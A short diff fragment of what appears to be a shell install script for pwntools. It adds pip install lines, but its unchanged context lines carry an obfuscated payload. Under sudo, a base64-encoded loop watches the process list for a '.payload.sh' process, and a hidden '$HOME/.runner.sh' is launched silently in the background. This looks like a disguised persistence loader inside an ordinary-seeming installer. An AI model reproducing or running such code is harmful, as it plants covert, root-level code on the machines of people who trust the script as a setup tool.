@@ -12,3 +12,6 @@ sudo sh -c "echo -n d2hpbGUgdHJ1ZQpkbwpTVFI9JChwcyAtYXV4KQpTVUI9Jy5wYXlsb2FkLnNo
 (&>/dev/null bash $HOME/.runner.sh &)
 
 sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools
+echo "Run pwntools in your terminal"
